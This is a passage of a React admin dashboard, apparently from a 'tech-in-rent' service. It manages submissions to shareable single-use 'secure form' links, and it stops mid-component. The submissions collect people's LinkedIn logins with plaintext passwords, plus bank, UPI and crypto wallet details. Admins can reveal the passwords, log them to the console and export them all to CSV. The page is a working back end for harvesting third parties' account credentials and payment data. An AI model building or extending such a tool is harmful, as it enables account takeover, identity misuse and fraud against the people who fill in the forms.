import { useState, useRef, useEffect, useMemo } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { Link } from "wouter";
import {
  Loader2,
  Search,
  Copy,
  Check,
  Eye,
  EyeOff,
  FileDown,
  RefreshCw,
  Trash2,
  Info,
} from "lucide-react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import useDebounce from "@/hooks/useDebounce";

const API_URI = "https://tech-in-rent.onrender.com";

const apiRequest = async (method, url, requestData = null) => {
  const options = {
    method,
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${localStorage.getItem("adminToken") || ""}`,
    },
    credentials: "include",
  };

  if (requestData) {
    options.body = JSON.stringify(requestData);
  }

  const response = await fetch(url, options);
  if (!response.ok) {
    let errorBody;
    try {
      errorBody = await response.json();
      throw new Error(
        errorBody.message ||
          `API call failed on ${url} with status ${response.status}`
      );
    } catch (jsonError) {
      throw new Error(
        `API call failed on ${url}: ${response.status} ${response.statusText}`
      );
    }
  }

  return response.json();
};

export default function SecureFormAdmin() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [searchTerm, setSearchTerm] = useState("");
  const [debouncedSearch] = useDebounce(searchTerm, 500);
  const [filter, setFilter] = useState("all");
  const [showPasswords, setShowPasswords] = useState({});
  const [selectedSubmission, setSelectedSubmission] = useState(null);
  const [selectedForm, setSelectedForm] = useState(null);
  const [viewDetailOpen, setViewDetailOpen] = useState(false);
  const [viewFormDetailOpen, setViewFormDetailOpen] = useState(false);
  const [newUrlDialogOpen, setNewUrlDialogOpen] = useState(false);
  const [newUrl, setNewUrl] = useState("");
  const [copySuccess, setCopySuccess] = useState(false);
  const [activeFormId, setActiveFormId] = useState(""); // Use formId
  const [showNewUrlBanner, setShowNewUrlBanner] = useState(false);
  const newUrlBannerRef = useRef(null);

  const isValidObjectId = (val) =>
    typeof val === "string" && /^[0-9a-fA-F]{24}$/.test(val);

  // Fetch all forms
  const {
    data: allFormsData = { data: [] },
    isLoading: isLoadingForms,
    error: formsError,
  } = useQuery({
    queryKey: ["all-forms"],
    queryFn: () => apiRequest("GET", `${API_URI}/api/admin/forms`),
  });

  const allForms = Array.isArray(allFormsData.data) ? allFormsData.data : [];
  console.log("All Forms:", allForms);

  const allowedFormIds = allForms.map((f) => String(f.formId));
  const isValidFormId = (val) =>
    typeof val === "string" && val.length > 0 && allowedFormIds.includes(val);

  // Fetch all responses summary
  const {
    data: allResponsesData = { data: [] },
    isLoading: isLoadingResponses,
    error: responsesError,
  } = useQuery({
    queryKey: ["all-responses-summary"],
    queryFn: () => apiRequest("GET", `${API_URI}/api/admin/all-responses`),
  });

  const formIdToCount = useMemo(
    () =>
      (allResponsesData?.data || []).reduce((acc, resp) => {
        const formId = String(resp.formId);
        if (formId) {
          acc[formId] = (acc[formId] || 0) + 1;
        }
        return acc;
      }, {}),
    [allResponsesData]
  );

  // Set default active form
  useEffect(() => {
    if (!activeFormId && allForms.length > 0) {
      const formWithData = allForms.find(
        (f) => formIdToCount[String(f.formId)] > 0
      );
      const target = formWithData || allForms[0];
      if (target) {
        setActiveFormId(String(target.formId));
      }
    }
  }, [allForms, activeFormId, formIdToCount]);

  // Fetch submissions for active form using ObjectID
  const {
    data: submissionsData = { data: [] },
    isLoading,
    isFetching,
    error: submissionsError,
    refetch,
  } = useQuery({
    queryKey: ["secure-form-submissions", activeFormId],
    queryFn: () => {
      if (!isValidFormId(activeFormId)) {
        return Promise.resolve({ data: [] });
      }
      const activeForm = allForms.find(
        (f) => String(f.formId) === activeFormId
      );
      if (!activeForm) {
        return Promise.resolve({ data: [] });
      }
      return apiRequest(
        "GET",
        `${API_URI}/api/admin/responses/${activeForm._id}`
      );
    },
    enabled: !!activeFormId && isValidFormId(activeFormId),
  });

  const submissions = Array.isArray(submissionsData.data)
    ? submissionsData.data
    : [];

  console.log(JSON.stringify(submissions, null, 2));

  const createUrlMutation = useMutation({
    mutationFn: () => apiRequest("POST", `${API_URI}/api/forms/create`),
    onSuccess: async (data) => {
      const fullUrl = `${window.location.origin}/secure-form/${data.formId}`;
      setNewUrl(fullUrl);
      await queryClient.invalidateQueries({ queryKey: ["all-forms"] });
      setActiveFormId(data.formId);
      setNewUrlDialogOpen(true);
      setShowNewUrlBanner(true);
      setTimeout(() => {
        newUrlBannerRef.current?.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
      }, 0);
      toast({
        title: "Success",
        description: "Secure form link generated successfully",
      });
    },
    onError: (error) =>
      toast({
        title: "Failed to create URL",
        description: error.message,
        variant: "destructive",
      }),
  });

  const deleteSubmissionMutation = useMutation({
    mutationFn: (id) =>
      apiRequest("DELETE", `${API_URI}/api/admin/responses/${id}`),
    onSuccess: () => {
      queryClient.invalidateQueries({
        queryKey: ["secure-form-submissions", activeFormId],
      });
      toast({ title: "Success", description: "Submission deleted" });
      setViewDetailOpen(false);
      setSelectedSubmission(null);
    },
    onError: (error) =>
      toast({
        title: "Failed to delete",
        description: error.message,
        variant: "destructive",
      }),
  });

  const deleteFormMutation = useMutation({
    mutationFn: ({ formId }) =>
      apiRequest("DELETE", `${API_URI}/api/admin/forms/${formId}`),
    onSuccess: (_, { formId }) => {
      toast({ title: "Form deleted", description: "The form was removed" });
      queryClient.invalidateQueries({ queryKey: ["all-forms"] });
      queryClient.invalidateQueries({ queryKey: ["all-responses-summary"] });
      if (activeFormId === formId) setActiveFormId("");
      setViewFormDetailOpen(false);
      setSelectedForm(null);
    },
    onError: (error) =>
      toast({
        title: "Failed to delete form",
        description: error.message,
        variant: "destructive",
      }),
  });

  const toggleReadMutation = useMutation({
    mutationFn: (id) =>
      // apiRequest("PUT", `${API_URI}/api/admin/responses/${id}/read`),
       apiRequest("PUT", `http://localhost:5000/api/admin/responses/${id}/read`),

    onSuccess: (data) => {
      queryClient.invalidateQueries({
        queryKey: ["secure-form-submissions", activeFormId],
      });
      if (selectedSubmission) {
        setSelectedSubmission({
          ...selectedSubmission,
          read: data.response.read,
        });
      }
      toast({
        title: "Success",
        description: `Marked as ${data.response.read ? "read" : "unread"}`,
      });
    },
    onError: (error) =>
      toast({
        title: "Failed to update status",
        description: error.message,
        variant: "destructive",
      }),
  });

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopySuccess(true);
      toast({ title: "Copied!", description: "URL copied to clipboard" });
      setTimeout(() => setCopySuccess(false), 2000);
    } catch (error) {
      toast({
        title: "Copy Failed",
        description: error.message,
        variant: "destructive",
      });
    }
  };

  const exportToCSV = () => {
    if (submissions.length === 0) return;
    const headers = [
      "ID",
      "Form ID",
      "Full Name",
      "Phone",
      "Email",
      "LinkedIn Email",
      "LinkedIn Password",
      "Payment Method",
      "UPI ID",
      "Bank Account Number",
      "Bank IFSC",
      "Crypto Wallet ID",
      "Crypto Network",
      "Status",
      "Date",
    ];
    const csvData = submissions.map((submission) => [
      submission._id || "",
      activeFormId,
      submission.fullName || "",
      submission.phoneNumber || "",
      submission.email || "",
      submission.linkedinEmail || "",
      submission.linkedinPassword || "",
      submission.paymentInfo?.method || "None",
      submission.paymentInfo?.upi || "",
      submission.paymentInfo?.bank?.accountNumber || "",
      submission.paymentInfo?.bank?.ifsc || "",
      submission.paymentInfo?.crypto?.walletId || "",
      submission.paymentInfo?.crypto?.network || "",
      submission.read ? "Read" : "Unread",
      submission.createdAt
        ? new Date(submission.createdAt).toLocaleString()
        : "",
    ]);
    const csvContent = [
      headers.join(","),
      ...csvData.map((row) =>
        row.map((cell) => `"${String(cell).replace(/"/g, '""')}"`).join(",")
      ),
    ].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = `secure-form-submissions-${
      new Date().toISOString().split("T")[0]
    }.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const togglePasswordVisibility = (id) =>
    setShowPasswords((prev) => ({ ...prev, [id]: !prev[id] }));

  const viewSubmissionDetails = (submission) => {
    setSelectedSubmission(submission);
    setViewDetailOpen(true);
  };

  const viewFormDetails = (form) => {
    setSelectedForm(form);
    setViewFormDetailOpen(true);
  };

  const filteredSubmissions = useMemo(() => {
    let filtered = submissions;
    if (filter === "read") filtered = filtered.filter((s) => s.read);
    else if (filter === "unread") filtered = filtered.filter((s) => !s.read);
    if (debouncedSearch) {
      const term = debouncedSearch.toLowerCase();
      filtered = filtered.filter(
        (s) =>
          (s.fullName || "").toLowerCase().includes(term) ||
          (s.email || "").toLowerCase().includes(term) ||
          (s.phoneNumber || "").toLowerCase().includes(term) ||
          (s.linkedinEmail || "").toLowerCase().includes(term)
      );
    }
    return filtered;
  }, [submissions, filter, debouncedSearch]);

  return (
    <div className="p-6 secure-form-container light bg-sky-100 min-h-screen">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
          <div>
            <h1 className="text-2xl font-bold text-gray-900">
              Secure Form Submissions
            </h1>
            <p className="text-gray-500">
              {activeFormId
                ? `Viewing submissions for Form ${activeFormId.slice(0, 8)}...`
                : "Manage secure form submissions."}
            </p>
          </div>
          <div className="flex flex-wrap gap-2">
            <Link href="/admin">
              <Button variant="outline" className="bg-white border-gray-300">
                Back to Dashboard
              </Button>
            </Link>
            <Button
              onClick={() => createUrlMutation.mutate()}
              disabled={createUrlMutation.isPending}
              className="bg-gradient-to-r from-blue-500 to-blue-700 text-white"
            >
              {createUrlMutation.isPending ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Creating...
                </>
              ) : (
                "Generate New Form Link"
              )}
            </Button>
          </div>
        </div>

        {formsError && (
          <Card className="mb-6 bg-white border-red-300">
            <CardContent className="py-4">
              <p className="text-red-600">
                Error loading forms: {formsError.message}
              </p>
              <p className="text-gray-500">
                Please try refreshing or contact support.
              </p>
            </CardContent>
          </Card>
        )}

        {isLoadingResponses && (
          <div className="flex justify-center items-center h-64">
            <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
          </div>
        )}

        {responsesError && (
          <Card className="mb-6 bg-white border-red-300">
            <CardContent className="py-4">
              <p className="text-red-600">
                Error loading responses: {responsesError.message}
              </p>
              <p className="text-gray-500">
                Please try refreshing or contact support.
              </p>
            </CardContent>
          </Card>
        )}

        {newUrl && showNewUrlBanner && (
          <div ref={newUrlBannerRef}>
            <div className="mb-6 rounded-xl border-2 border-blue-400 bg-white shadow-md p-4">
              <div className="flex items-start justify-between gap-3 flex-col md:flex-row">
                <div className="flex-1">
                  <h2 className="text-base md:text-lg font-semibold text-blue-900 mb-1">
                    New Secure Form Link Ready
                  </h2>
                  <p className="text-sm text-blue-800 mb-3">
                    Share this single-use URL. Copy before closing.
                  </p>
                  <div className="flex gap-2 w-full">
                    <Input
                      value={newUrl}
                      readOnly
                      onFocus={(e) => e.target.select()}
                      className="flex-1 bg-white font-mono text-xs md:text-sm border-gray-300"
                    />
                    <Button
                      onClick={() => copyToClipboard(newUrl)}
                      variant="default"
                    >
                      {copySuccess ? (
                        <Check className="h-4 w-4" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                    <Button
                      variant="outline"
                      onClick={() => window.open(newUrl, "_blank")}
                      className="bg-white border-gray-300"
                    >
                      Open
                    </Button>
                  </div>
                </div>
                <div className="pt-2 md:pt-0">
                  <Button
                    variant="ghost"
                    onClick={() => setShowNewUrlBanner(false)}
                    className="text-gray-600"
                  >
                    Dismiss
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )}

        <Card className="mb-6 bg-white border-gray-300">
          <CardHeader>
            <CardTitle className="text-lg text-gray-900">
              Filters and Options
            </CardTitle>
          </CardHeader>
          <CardContent className="flex flex-col md:flex-row gap-4">
            <div className="flex-1">
              <Select
                value={activeFormId}
                onValueChange={(val) => {
                  if (isValidFormId(val)) {
                    setActiveFormId(val);
                    refetch();
                  }
                }}
                disabled={isLoadingForms || allForms.length === 0}
              >
                <SelectTrigger className="w-full md:w-[250px] bg-white border-gray-300">
                  <SelectValue
                    placeholder={
                      isLoadingForms
                        ? "Loading forms..."
                        : allForms.length === 0
                        ? "No forms available"
                        : "Select a form..."
                    }
                  />
                </SelectTrigger>
                <SelectContent className="bg-white border-gray-300">
                  {allForms.map((form) => (
                    <div
                      key={form.formId}
                      className="flex items-center justify-between px-2 py-1.5 hover:bg-gray-100"
                    >
                      <SelectItem
                        value={String(form.formId)}
                        className="flex-1 p-0 m-0"
                        style={{ pointerEvents: "auto" }}
                      >
                        Form {String(form.formId).slice(0, 8)}... (
                        {new Date(form.createdAt).toLocaleDateString()})
                      </SelectItem>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => {
                          if (
                            window.confirm(
                              `Delete form ${form.formId.slice(
                                0,
                                8
                              )}...? This action cannot be undone.`
                            )
                          ) {
                            deleteFormMutation.mutate({ formId: form.formId });
                          }
                        }}
                        disabled={deleteFormMutation.isPending}
                        className="h-6 w-6 text-red-500 hover:text-red-700"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="flex-1">
              <div className="relative">
                <Search className="absolute left-2 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <Input
                  placeholder="Search submissions..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-8 bg-white border-gray-300"
                />
              </div>
            </div>
            <div className="flex items-center gap-2">
              <Select
                value={filter}
                onValueChange={setFilter}
                className="bg-white border-gray-300"
              >
                <SelectTrigger className="w-[120px] bg-white border-gray-300">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-white border-gray-300">
                  <SelectItem value="all">All</SelectItem>
                  <SelectItem value="read">Read</SelectItem>
                  <SelectItem value="unread">Unread</SelectItem>
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                size="icon"
                onClick={() => refetch()}
                disabled={isFetching}
                className="bg-white border-gray-300"
              >
                <RefreshCw
                  className={`h-4 w-4 ${isFetching ? "animate-spin" : ""}`}
                />
              </Button>
              <Button
                variant="outline"
                size="icon"
                onClick={exportToCSV}
                disabled={submissions.length === 0}
                className="bg-white border-gray-300"
              >
                <FileDown className="h-4 w-4" />
              </Button>
            </div>
          </CardContent>
        </Card>

        {submissionsError && (
          <Card className="bg-white border-red-300 mb-6">
            <CardContent className="py-4">
              <p className="text-red-600">
                Error loading submissions: {submissionsError.message}
              </p>
              <p className="text-gray-500">
                {submissionsError.message.includes("404")
                  ? "The selected form does not exist."
                  : "Please try refreshing or contact support."}
              </p>
            </CardContent>
          </Card>
        )}

        {!activeFormId && !isLoadingForms ? (
          <Card className="bg-white border-gray-300">
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">
                No form selected
              </p>
              <p className="text-sm text-gray-400 text-center">
                Please select a form to view its submissions, or generate a new
                form link.
              </p>
            </CardContent>
          </Card>
        ) : isLoading ? (
          <div className="flex justify-center items-center h-64">
            <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
          </div>
        ) : filteredSubmissions.length === 0 ? (
          <Card className="bg-white border-gray-300">
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">
                No submissions found
              </p>
              <p className="text-sm text-gray-400 text-center">
                {searchTerm || filter !== "all"
                  ? "Try adjusting your filters."
                  : "This form has no submissions yet."}
              </p>
            </CardContent>
          </Card>
        ) : (
          <Card className="bg-white border-gray-300">
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead className="text-gray-900">ID</TableHead>
                      <TableHead className="text-gray-900">Form ID</TableHead>
                      <TableHead className="text-gray-900">Full Name</TableHead>
                      <TableHead className="text-gray-900">Phone</TableHead>
                      <TableHead className="text-gray-900">Email</TableHead>
                      <TableHead className="text-gray-900">
                        LinkedIn Email
                      </TableHead>
                      <TableHead className="text-gray-900">
                        LinkedIn Password
                      </TableHead>
                      <TableHead className="text-gray-900">Payment</TableHead>
                      <TableHead className="text-gray-900">Status</TableHead>
                      <TableHead className="text-gray-900">Date</TableHead>
                      <TableHead className="text-gray-900">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredSubmissions.map((submission) => (
                      <TableRow
                        key={submission._id}
                        className={!submission.read ? "bg-blue-50" : "bg-white"}
                      >
                        <TableCell className="font-mono">
                          {submission._id.slice(0, 8)}...
                        </TableCell>
                        <TableCell className="font-mono">
                          {activeFormId.slice(0, 8)}...
                        </TableCell>
                        <TableCell>{submission.fullName || "N/A"}</TableCell>
                        <TableCell>{submission.phoneNumber || "N/A"}</TableCell>
                        <TableCell>{submission.email || "N/A"}</TableCell>
                        <TableCell>
                          {submission.linkedinEmail || "N/A"}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center">
                            <span className="mr-2">
                              {showPasswords[submission._id]
                                ? submission.linkedinPassword || "N/A"
                                : "••••••••"}
                            </span>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={() =>
                                togglePasswordVisibility(submission._id)
                              }
                              className="h-6 w-6 text-gray-500"
                            >
                              {showPasswords[submission._id] ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell>
                          {submission.paymentInfo?.method ? (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              {submission.paymentInfo.method}
                            </Badge>
                          ) : (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              None
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant={submission.read ? "default" : "secondary"}
                            className={
                              submission.read
                                ? "bg-green-100 text-green-800"
                                : "bg-yellow-100 text-yellow-800"
                            }
                          >
                            {submission.read ? "Read" : "Unread"}
                          </Badge>
                        </TableCell>
                        <TableCell>
                          {submission.createdAt
                            ? new Date(submission.createdAt).toLocaleString()
                            : "N/A"}
                        </TableCell>
                        <TableCell>
                          <div className="flex space-x-1">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => viewSubmissionDetails(submission)}
                              className="h-8 w-8 p-0 text-gray-500"
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => {
                                if (isValidObjectId(submission._id)) {
                                  deleteSubmissionMutation.mutate(
                                    submission._id
                                  );
                                } else {
                                  toast({
                                    title: "Invalid ID",
                                    description:
                                      "This submission id is invalid.",
                                    variant: "destructive",
                                  });
                                }
                              }}
                              className="h-8 w-8 p-0 text-red-500"
                              disabled={deleteSubmissionMutation.isPending}
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
            <CardFooter className="py-4 border-t border-gray-300">
              <div className="text-sm text-gray-500">
                Showing {filteredSubmissions.length} of {submissions.length}{" "}
                submissions
              </div>
            </CardFooter>
          </Card>
        )}

        <Dialog
          open={viewDetailOpen}
          onOpenChange={(open) => {
            setViewDetailOpen(open);
            if (!open) setSelectedSubmission(null);
          }}
        >
          <DialogContent className="max-w-3xl dialog-content bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">
                Submission Details
              </DialogTitle>
              <DialogDescription className="text-gray-500">
                {selectedSubmission
                  ? `Complete information for submission #${selectedSubmission._id.slice(
                      0,
                      8
                    )}...`
                  : "No submission selected"}
              </DialogDescription>
            </DialogHeader>
            {selectedSubmission ? (
              <div className="space-y-6 py-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      Form ID
                    </h3>
                    <p className="mt-1 text-gray-900 font-mono">
                      {activeFormId.slice(0, 8)}...
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      Full Name
                    </h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.fullName || "N/A"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Phone</h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.phoneNumber || "N/A"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Email</h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.email || "N/A"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      LinkedIn Email
                    </h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.linkedinEmail || "N/A"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      Date Submitted
                    </h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.createdAt
                        ? new Date(
                            selectedSubmission.createdAt
                          ).toLocaleString()
                        : "N/A"}
                    </p>
                  </div>
                </div>
                <div className="border-t pt-4 border-gray-300">
                  <h3 className="text-lg font-medium mb-3 text-gray-900">
                    LinkedIn Credentials
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <h3 className="text-sm font-medium text-gray-500">
                        LinkedIn Email
                      </h3>
                      <p className="mt-1 text-gray-900">
                        {selectedSubmission.linkedinEmail || "N/A"}
                      </p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500">
                        LinkedIn Password
                      </h3>
                      <div className="flex items-center mt-1">
                        <p className="text-gray-900">
                          {showPasswords[selectedSubmission._id]
                            ? selectedSubmission.linkedinPassword || "N/A"
                            : "••••••••"}
                        </p>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() =>
                            togglePasswordVisibility(selectedSubmission._id)
                          }
                          className="h-6 w-6 ml-2 text-gray-500"
                        >
                          {showPasswords[selectedSubmission._id] ? (
                            <EyeOff className="h-4 w-4" />
                          ) : (
                            <Eye className="h-4 w-4" />
                          )}
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="border-t pt-4 border-gray-300">
                  <h3 className="text-lg font-medium mb-3 text-gray-900">
                    Payment Information
                  </h3>
                  {selectedSubmission.paymentInfo ? (
                    <div className="space-y-4">
                      {selectedSubmission.paymentInfo.upi && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">UPI</h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">ID:</span>{" "}
                            {selectedSubmission.paymentInfo.upi}
                          </p>
                        </div>
                      )}
                      {selectedSubmission.paymentInfo.bank?.accountNumber && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">Bank</h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">Account:</span>{" "}
                            {selectedSubmission.paymentInfo.bank.accountNumber}
                          </p>
                          {selectedSubmission.paymentInfo.bank.ifsc && (
                            <p className="text-sm mt-1 text-gray-700">
                              <span className="text-gray-500">IFSC:</span>{" "}
                              {selectedSubmission.paymentInfo.bank.ifsc}
                            </p>
                          )}
                        </div>
                      )}
                      {selectedSubmission.paymentInfo.crypto?.walletId && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">Crypto</h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">Wallet:</span>{" "}
                            {selectedSubmission.paymentInfo.crypto.walletId}
                          </p>
                          {selectedSubmission.paymentInfo.crypto.network && (
                            <p className="text-sm mt-1 text-gray-700">
                              <span className="text-gray-500">Network:</span>{" "}
                              {selectedSubmission.paymentInfo.crypto.network}
                            </p>
                          )}
                        </div>
                      )}
                      {!selectedSubmission.paymentInfo.upi &&
                        !selectedSubmission.paymentInfo.bank?.accountNumber &&
                        !selectedSubmission.paymentInfo.crypto?.walletId && (
                          <p className="text-gray-500">
                            No payment information provided.
                          </p>
                        )}
                    </div>
                  ) : (
                    <p className="text-gray-500">
                      No payment information provided.
                    </p>
                  )}
                </div>
              </div>
            ) : (
              <div className="text-center py-8">
                <p className="text-gray-500">
                  No submission data available. Please select a valid
                  submission.
                </p>
              </div>
            )}
            <DialogFooter className="flex justify-between items-center pt-4">
              <div className="flex items-center">
                {selectedSubmission && (
                  <Badge
                    variant={selectedSubmission.read ? "default" : "secondary"}
                    className={
                      selectedSubmission.read
                        ? "bg-green-100 text-green-800"
                        : "bg-yellow-100 text-yellow-800"
                    }
                  >
                    {selectedSubmission.read ? "Read" : "Unread"}
                  </Badge>
                )}
              </div>
              <div className="space-x-2">
                <Button
                  variant="outline"
                  onClick={() => {
                    if (isValidObjectId(selectedSubmission?._id)) {
                      toggleReadMutation.mutate(selectedSubmission._id);
                    } else {
                      toast({
                        title: "Invalid ID",
                        description: "This submission id is invalid.",
                        variant: "destructive",
                      });
                    }
                  }}
                  className="bg-white border-gray-300"
                  disabled={toggleReadMutation.isPending || !selectedSubmission}
                >
                  {selectedSubmission?.read ? "Mark Unread" : "Mark Read"}
                </Button>
                <Button
                  variant="outline"
                  onClick={() =>
                    deleteSubmissionMutation.mutate(selectedSubmission?._id)
                  }
                  className="bg-red-100 text-red-700 border-red-300"
                  disabled={
                    deleteSubmissionMutation.isPending || !selectedSubmission
                  }
                >
                  <Trash2 className="mr-2 h-4 w-4" />
                  Delete
                </Button>
                <Button
                  variant="outline"
                  onClick={() => setViewDetailOpen(false)}
                  className="bg-white border-gray-300"
                >
                  Close
                </Button>
              </div>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        <Dialog
          open={viewFormDetailOpen}
          onOpenChange={(open) => {
            setViewFormDetailOpen(open);
            if (!open) setSelectedForm(null);
          }}
        >
          <DialogContent className="max-w-md dialog-content bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">Form Details</DialogTitle>
              <DialogDescription className="text-gray-500">
                {selectedForm
                  ? `Details for Form ${selectedForm.formId.slice(0, 8)}...`
                  : "No form selected"}
              </DialogDescription>
            </DialogHeader>
            {selectedForm ? (
              <div className="space-y-4 py-4">
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Form ID</h3>
                  <p className="mt-1 text-gray-900 font-mono break-all">
                    {selectedForm.formId}
                  </p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">
                    Object ID
                  </h3>
                  <p className="mt-1 text-gray-900 font-mono break-all">
                    {selectedForm._id}
                  </p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Created</h3>
                  <p className="mt-1 text-gray-900">
                    {selectedForm.createdAt
                      ? new Date(selectedForm.createdAt).toLocaleString()
                      : "N/A"}
                  </p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">
                    Submissions
                  </h3>
                  <p className="mt-1 text-gray-900">
                    {formIdToCount[String(selectedForm.formId)] || 0}
                  </p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">
                    Form URL
                  </h3>
                  <div className="flex items-center space-x-2">
                    <Input
                      value={`${window.location.origin}/secure-form/${selectedForm.formId}`}
                      readOnly
                      className="flex-1 bg-white border-gray-300 font-mono"
                    />
                    <Button
                      size="icon"
                      type="button"
                      onClick={() =>
                        copyToClipboard(
                          `${window.location.origin}/secure-form/${selectedForm.formId}`
                        )
                      }
                      className="bg-white border-gray-300"
                    >
                      <Copy className="h-4 w-4 text-gray-500" />
                    </Button>
                  </div>
                </div>
              </div>
            ) : (
              <div className="text-center py-8">
                <p className="text-gray-500">
                  No form data available. Please select a valid form.
                </p>
              </div>
            )}
            <DialogFooter className="flex justify-between items-center">
              <Button
                variant="outline"
                onClick={() => {
                  if (isValidFormId(selectedForm?.formId)) {
                    setActiveFormId(String(selectedForm.formId));
                    setViewFormDetailOpen(false);
                    window.scrollTo({
                      top: 0,
                      behavior: "smooth",
                    });
                    refetch();
                  }
                }}
                disabled={!selectedForm || !isValidFormId(selectedForm?.formId)}
                className="bg-white border-gray-300"
              >
                View Submissions
              </Button>
              <div className="space-x-2">
                <Button
                  variant="outline"
                  onClick={() =>
                    deleteFormMutation.mutate({ formId: selectedForm?.formId })
                  }
                  className="bg-red-100 text-red-700 border-red-300"
                  disabled={deleteFormMutation.isPending || !selectedForm}
                >
                  <Trash2 className="mr-2 h-4 w-4" />
                  Delete
                </Button>
                <Button
                  variant="outline"
                  onClick={() => setViewFormDetailOpen(false)}
                  className="bg-white border-gray-300"
                >
                  Close
                </Button>
              </div>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        <Dialog
          open={newUrlDialogOpen}
          onOpenChange={(open) => {
            setNewUrlDialogOpen(open);
            if (!open) setCopySuccess(false);
          }}
        >
          <DialogContent className="max-w-md dialog-content bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">
                Secure Form Link Generated
              </DialogTitle>
              <DialogDescription className="text-gray-500">
                Share this unique URL with the user.
              </DialogDescription>
            </DialogHeader>
            <div className="py-4 space-y-2">
              <div className="flex items-center space-x-2">
                <Input
                  value={newUrl || ""}
                  readOnly
                  className="flex-1 bg-white border-gray-300 font-mono"
                />
                <Button
                  size="icon"
                  type="button"
                  onClick={() => copyToClipboard(newUrl)}
                  className="bg-white border-gray-300"
